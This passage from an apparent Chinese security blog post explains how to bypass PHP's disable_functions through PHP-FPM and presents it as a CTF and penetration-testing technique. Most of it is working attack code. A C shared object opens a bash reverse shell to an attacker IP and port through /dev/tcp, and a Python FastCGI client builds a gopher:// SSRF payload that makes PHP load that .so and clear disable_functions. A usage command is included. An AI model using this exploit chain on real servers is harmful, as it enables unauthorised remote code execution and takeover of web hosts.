title="加载so绕过disable_functions"></a>加载so绕过disable_functions</h2><blockquote><p>两种通信方式都能使用此方法绕过</p></blockquote><p>在CTF或者渗透测试中经常会遇到目标环境设置了 disable_functions 的情况，但是 PHP_ADMIN_VALUE 不可以设置 disable_functions ，因为这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中</p><p>但是我们可以参考 LD_PRELOAD 绕过的方式，上传一个恶意so文件，然后通过 PHP_VALUE 给 php.ini 添加一个 extender 扩展</p><p>制作恶意so文件</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span>** environ;<br>__attribute__ ((__constructor__)) <span class="hljs-type">void</span> <span class="hljs-title function_">preload</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; environ[i]; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">strstr</span>(environ[i], <span class="hljs-string">&quot;LD_PRELOAD&quot;</span>)) &#123;<br>                    environ[i][<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>            &#125;<br>    &#125;<br>    system(<span class="hljs-string">&quot;bash -c &#x27;exec bash -i &amp;&gt;/dev/tcp/IP/PORT &lt;&amp;1&#x27;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译</p><p><code>gcc -c -fPIC hack.c -o hack &amp;&amp; gcc --share hack -o hack.so</code></p><p>以下是修改过的 <a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a>，可以生成payload，注意修改 PHP_VALUE 的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><br><span class="hljs-comment"># 修改点 1</span><br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br><span class="hljs-comment"># Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client</span><br><br>PY2 = <span class="hljs-literal">True</span> <span class="hljs-keyword">if</span> sys.version_info.major == <span class="hljs-number">2</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">False</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bchr</span>(<span class="hljs-params">i</span>):<br>    <span class="hljs-keyword">if</span> PY2:<br>        <span class="hljs-keyword">return</span> force_bytes(<span class="hljs-built_in">chr</span>(i))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>([i])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bord</span>(<span class="hljs-params">c</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(c, <span class="hljs-built_in">int</span>):<br>        <span class="hljs-keyword">return</span> c<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">ord</span>(c)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_bytes</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> s.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_text</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">issubclass</span>(<span class="hljs-built_in">type</span>(s), <span class="hljs-built_in">str</span>):<br>        <span class="hljs-keyword">return</span> s<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>):<br>        s = <span class="hljs-built_in">str</span>(s, <span class="hljs-string">&#x27;utf-8&#x27;</span>, <span class="hljs-string">&#x27;strict&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        s = <span class="hljs-built_in">str</span>(s)<br>    <span class="hljs-keyword">return</span> s<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">FastCGIClient</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;A Fast-CGI Client for Python&quot;&quot;&quot;</span><br><br>    <span class="hljs-comment"># private</span><br>    __FCGI_VERSION = <span class="hljs-number">1</span><br><br>    __FCGI_ROLE_RESPONDER = <span class="hljs-number">1</span><br>    __FCGI_ROLE_AUTHORIZER = <span class="hljs-number">2</span><br>    __FCGI_ROLE_FILTER = <span class="hljs-number">3</span><br><br>    __FCGI_TYPE_BEGIN = <span class="hljs-number">1</span><br>    __FCGI_TYPE_ABORT = <span class="hljs-number">2</span><br>    __FCGI_TYPE_END = <span class="hljs-number">3</span><br>    __FCGI_TYPE_PARAMS = <span class="hljs-number">4</span><br>    __FCGI_TYPE_STDIN = <span class="hljs-number">5</span><br>    __FCGI_TYPE_STDOUT = <span class="hljs-number">6</span><br>    __FCGI_TYPE_STDERR = <span class="hljs-number">7</span><br>    __FCGI_TYPE_DATA = <span class="hljs-number">8</span><br>    __FCGI_TYPE_GETVALUES = <span class="hljs-number">9</span><br>    __FCGI_TYPE_GETVALUES_RESULT = <span class="hljs-number">10</span><br>    __FCGI_TYPE_UNKOWNTYPE = <span class="hljs-number">11</span><br><br>    __FCGI_HEADER_SIZE = <span class="hljs-number">8</span><br><br>    <span class="hljs-comment"># request state</span><br>    FCGI_STATE_SEND = <span class="hljs-number">1</span><br>    FCGI_STATE_ERROR = <span class="hljs-number">2</span><br>    FCGI_STATE_SUCCESS = <span class="hljs-number">3</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, host, port, timeout, keepalive</span>):<br>        <span class="hljs-variable language_">self</span>.host = host<br>        <span class="hljs-variable language_">self</span>.port = port<br>        <span class="hljs-variable language_">self</span>.timeout = timeout<br>        <span class="hljs-keyword">if</span> keepalive:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.keepalive = <span class="hljs-number">0</span><br>        <span class="hljs-variable language_">self</span>.sock = <span class="hljs-literal">None</span><br>        <span class="hljs-variable language_">self</span>.requests = <span class="hljs-built_in">dict</span>()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__connect</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>        <span class="hljs-variable language_">self</span>.sock.settimeout(<span class="hljs-variable language_">self</span>.timeout)<br>        <span class="hljs-variable language_">self</span>.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># if self.keepalive:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span><br>        <span class="hljs-comment"># else:</span><br>        <span class="hljs-comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span><br><br>        <span class="hljs-comment"># 修改点 2</span><br>        <span class="hljs-comment"># try:</span><br>        <span class="hljs-comment">#     self.sock.connect((self.host, int(self.port)))</span><br>        <span class="hljs-comment"># except socket.error as msg:</span><br>        <span class="hljs-comment">#     self.sock.close()</span><br>        <span class="hljs-comment">#     self.sock = None</span><br>        <span class="hljs-comment">#     print(repr(msg))</span><br>        <span class="hljs-comment">#     return False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeFastCGIRecord</span>(<span class="hljs-params">self, fcgi_type, content, requestid</span>):<br>        length = <span class="hljs-built_in">len</span>(content)<br>        buf = bchr(FastCGIClient.__FCGI_VERSION) \<br>              + bchr(fcgi_type) \<br>              + bchr((requestid &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(requestid &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr((length &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(length &amp; <span class="hljs-number">0xFF</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + bchr(<span class="hljs-number">0</span>) \<br>              + content<br>        <span class="hljs-keyword">return</span> buf<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__encodeNameValueParams</span>(<span class="hljs-params">self, name, value</span>):<br>        nLen = <span class="hljs-built_in">len</span>(name)<br>        vLen = <span class="hljs-built_in">len</span>(value)<br>        record = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(nLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((nLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((nLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(nLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">if</span> vLen &lt; <span class="hljs-number">128</span>:<br>            record += bchr(vLen)<br>        <span class="hljs-keyword">else</span>:<br>            record += bchr((vLen &gt;&gt; <span class="hljs-number">24</span>) | <span class="hljs-number">0x80</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr((vLen &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xFF</span>) \<br>                      + bchr(vLen &amp; <span class="hljs-number">0xFF</span>)<br>        <span class="hljs-keyword">return</span> record + name + value<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIHeader</span>(<span class="hljs-params">self, stream</span>):<br>        header = <span class="hljs-built_in">dict</span>()<br>        header[<span class="hljs-string">&#x27;version&#x27;</span>] = bord(stream[<span class="hljs-number">0</span>])<br>        header[<span class="hljs-string">&#x27;type&#x27;</span>] = bord(stream[<span class="hljs-number">1</span>])<br>        header[<span class="hljs-string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="hljs-number">2</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">3</span>])<br>        header[<span class="hljs-string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="hljs-number">4</span>]) &lt;&lt; <span class="hljs-number">8</span>) + bord(stream[<span class="hljs-number">5</span>])<br>        header[<span class="hljs-string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="hljs-number">6</span>])<br>        header[<span class="hljs-string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="hljs-number">7</span>])<br>        <span class="hljs-keyword">return</span> header<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__decodeFastCGIRecord</span>(<span class="hljs-params">self, buffer</span>):<br>        header = buffer.read(<span class="hljs-built_in">int</span>(<span class="hljs-variable language_">self</span>.__FCGI_HEADER_SIZE))<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> header:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            record = <span class="hljs-variable language_">self</span>.__decodeFastCGIHeader(header)<br>            record[<span class="hljs-string">&#x27;content&#x27;</span>] = <span class="hljs-string">b&#x27;&#x27;</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;contentLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                contentLength = <span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;contentLength&#x27;</span>])<br>                record[<span class="hljs-string">&#x27;content&#x27;</span>] += buffer.read(contentLength)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;paddingLength&#x27;</span> <span class="hljs-keyword">in</span> record.keys():<br>                skiped = buffer.read(<span class="hljs-built_in">int</span>(record[<span class="hljs-string">&#x27;paddingLength&#x27;</span>]))<br>            <span class="hljs-keyword">return</span> record<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">request</span>(<span class="hljs-params">self, nameValuePairs=&#123;&#125;, post=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-variable language_">self</span>.__connect():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br><br>        requestId = random.randint(<span class="hljs-number">1</span>, (<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">16</span>) - <span class="hljs-number">1</span>)<br>        <span class="hljs-variable language_">self</span>.requests[requestId] = <span class="hljs-built_in">dict</span>()<br>        request = <span class="hljs-string">b&quot;&quot;</span><br>        beginFCGIRecordContent = bchr(<span class="hljs-number">0</span>) \<br>                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \<br>                                 + bchr(<span class="hljs-variable language_">self</span>.keepalive) \<br>                                 + bchr(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span><br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,<br>                                              beginFCGIRecordContent, requestId)<br>        paramsRecord = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> nameValuePairs:<br>            <span class="hljs-keyword">for</span> (name, value) <span class="hljs-keyword">in</span> nameValuePairs.items():<br>                name = force_bytes(name)<br>                value = force_bytes(value)<br>                paramsRecord += <span class="hljs-variable language_">self</span>.__encodeNameValueParams(name, value)<br><br>        <span class="hljs-keyword">if</span> paramsRecord:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-keyword">if</span> post:<br>            request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)<br>        request += <span class="hljs-variable language_">self</span>.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="hljs-string">b&#x27;&#x27;</span>, requestId)<br><br>        <span class="hljs-comment"># 修改点 3</span><br>        <span class="hljs-comment"># self.sock.send(request)</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span><br>        <span class="hljs-comment"># self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span><br>        <span class="hljs-comment"># return self.__waitForResponse(requestId)</span><br>        <span class="hljs-keyword">return</span> request<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__waitForResponse</span>(<span class="hljs-params">self, requestId</span>):<br>        data = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            buf = <span class="hljs-variable language_">self</span>.sock.recv(<span class="hljs-number">512</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">len</span>(buf):<br>                <span class="hljs-keyword">break</span><br>            data += buf<br><br>        data = BytesIO(data)<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            response = <span class="hljs-variable language_">self</span>.__decodeFastCGIRecord(data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> response:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \<br>                    <span class="hljs-keyword">or</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:<br>                    <span class="hljs-variable language_">self</span>.requests[<span class="hljs-string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR<br>                <span class="hljs-keyword">if</span> requestId == <span class="hljs-built_in">int</span>(response[<span class="hljs-string">&#x27;requestId&#x27;</span>]):<br>                    <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>] += response[<span class="hljs-string">&#x27;content&#x27;</span>]<br>            <span class="hljs-keyword">if</span> response[<span class="hljs-string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:<br>                <span class="hljs-variable language_">self</span>.requests[requestId]<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.requests[requestId][<span class="hljs-string">&#x27;response&#x27;</span>]<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__repr__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.host, <span class="hljs-variable language_">self</span>.port)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;host&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-c&#x27;</span>, <span class="hljs-string">&#x27;--code&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="hljs-string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;-p&#x27;</span>, <span class="hljs-string">&#x27;--port&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;FastCGI port&#x27;</span>, default=<span class="hljs-number">9000</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">int</span>)<br><br>    args = parser.parse_args()<br><br>    client = FastCGIClient(args.host, args.port, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>)<br>    params = <span class="hljs-built_in">dict</span>()<br>    documentRoot = <span class="hljs-string">&quot;/&quot;</span><br>    uri = args.file<br>    content = args.code<br>    params = &#123;<br>        <span class="hljs-string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="hljs-string">&#x27;FastCGI/1.0&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="hljs-string">&#x27;POST&#x27;</span>,<br>        <span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="hljs-string">&#x27;/&#x27;</span>),<br>        <span class="hljs-string">&#x27;SCRIPT_NAME&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>,<br>        <span class="hljs-string">&#x27;REQUEST_URI&#x27;</span>: uri,<br>        <span class="hljs-string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,<br>        <span class="hljs-string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="hljs-string">&#x27;php/fcgiclient&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;REMOTE_PORT&#x27;</span>: <span class="hljs-string">&#x27;9985&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_ADDR&#x27;</span>: <span class="hljs-string">&#x27;127.0.0.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PORT&#x27;</span>: <span class="hljs-string">&#x27;80&#x27;</span>,<br>        <span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>: <span class="hljs-string">&quot;localhost&quot;</span>,<br>        <span class="hljs-string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="hljs-string">&#x27;HTTP/1.1&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="hljs-string">&#x27;application/text&#x27;</span>,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="hljs-string">&quot;%d&quot;</span> % <span class="hljs-built_in">len</span>(content),<br>        <span class="hljs-string">&#x27;PHP_VALUE&#x27;</span>: <span class="hljs-string">&#x27;unserialize_callback_func = system\nextension_dir = /tmp\nextension = hack.so\ndisable_classes = \ndisable_functions = \nallow_url_include = On\nopen_basedir = /\nauto_prepend_file = &#x27;</span>,<br>        <span class="hljs-string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="hljs-string">&#x27;allow_url_include = On&#x27;</span><br>    &#125;<br>    <span class="hljs-comment"># 修改点 4</span><br>    <span class="hljs-comment"># response = client.request(params, content)</span><br>    <span class="hljs-comment"># print(force_text(response))</span><br>    request_ssrf = quote(client.request(params, content))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;gopher://127.0.0.1:&quot;</span> + <span class="hljs-built_in">str</span>(args.port) + <span class="hljs-string">&quot;/_&quot;</span> + request_ssrf)<br><br></code></pre></td></tr></table></figure><p>用法和原来一样</p><p><code>python fpm.py 127.0.0.1 -p 9001 /var/www/html/add_api.php -c &quot;&lt;?php phpinfo(); ?&gt;&quot;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;PHP-FPM 是 FastCGI 的一个具体实现（协议解析器）&lt;/p&gt;
&lt;p&gt;Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给FPM，然后FPM按照fastcgi的协议将TCP流解析成真正的数据&lt;/p&gt;
&lt;p&gt;举个例子，用户访问&lt;code&gt;h</summary>
      
    
    
    
    <category term="总结" scheme="https://www.dr0n.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="总结" scheme="https://www.dr0n.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="php" scheme="https://www.dr0n.top/tags/php/"/>
    
    <category term="中间件" scheme="https://www.dr0n.top/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
    
